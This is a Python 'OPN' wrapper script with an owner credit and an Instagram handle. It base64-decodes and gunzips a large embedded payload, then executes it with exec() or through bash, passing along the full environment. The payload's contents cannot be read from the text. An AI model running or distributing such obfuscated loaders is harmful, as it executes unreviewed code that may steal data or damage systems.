#!/usr/bin/env python3

# ============================================================
#                   </> : TOOL NAME OPN ||
#                       OWNER : Krishn 🔱 
# 		   </> :  FOLLW IN INSTAGRAM : ur_.krishn._02
# ============================================================

import base64
import gzip
import os
import subprocess
import sys


PAYLOAD = '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'

FILE_TYPE = '.py'


def load_source():

    try:

        data = base64.b64decode(
            PAYLOAD
        )

        return gzip.decompress(
            data
        )

    except Exception as error:

        print(
            "[OPN] Payload error:",
            error
        )

        return None


def run_python(source):

    try:

        # Preserve the original command-line arguments.
        sys.argv[0] = os.path.abspath(__file__)

        code = compile(
            source.decode("utf-8-sig"),
            "<OPN-Protected-Python>",
            "exec"
        )

        namespace = {
            "__name__": "__main__",
            "__file__": os.path.abspath(__file__),
            "__package__": None,
            "__cached__": None,
        }

        exec(
            code,
            namespace,
            namespace
        )

        return 0

    except SystemExit as error:

        # Preserve normal sys.exit() behavior.
        if error.code is None:
            return 0

        if isinstance(error.code, int):
            return error.code

        print(error.code)
        return 1

    except Exception as error:

        print(
            "[OPN] Python execution error:",
            error
        )

        return 1


def run_bash(source):

    try:

        # Execute through the system bash while preserving
        # the current environment and command-line arguments.
        result = subprocess.run(
            [
                "bash",
                "-c",
                source.decode("utf-8-sig"),
                "OPN-PROTECTED",
                *sys.argv[1:]
            ],
            env=os.environ.copy(),
            cwd=os.getcwd()
        )

        return result.returncode

    except Exception as error:

        print(
            "[OPN] Bash execution error:",
            error
        )

        return 1


def main():

    source = load_source()

    if source is None:
        return 1

    if FILE_TYPE == ".py":
        return run_python(source)

    if FILE_TYPE == ".sh":
        return run_bash(source)

    print(
        "[OPN] Unsupported file type."
    )

    return 1


if __name__ == "__main__":

    try:

        sys.exit(
            main()
        )

    except KeyboardInterrupt:

        print(
            "\n[OPN] Stopped by user."
        )

        sys.exit(130)

    except Exception as error:

        print(
            "[OPN] Unexpected error:",
            error
        )

        sys.exit(1)
